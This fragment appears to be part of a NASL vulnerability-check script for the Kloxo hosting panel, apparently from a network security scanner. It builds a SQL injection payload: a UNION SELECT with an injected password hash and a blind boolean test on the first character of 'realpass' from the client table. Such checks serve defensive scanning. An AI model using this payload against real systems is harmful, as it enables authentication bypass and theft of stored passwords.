...
if(description){
	...
	script_dependencies( "gb_lxcenter_kloxo_detect.sc" );
...
sqli = NASLString( "al5i' union select '$1$Tw5.g72.$/0X4oceEHjGOgJB/fqRww/' from client where" );
sqli += NASLString( " ascii(substring(( select realpass from client limit 1),1,1))=68#" );
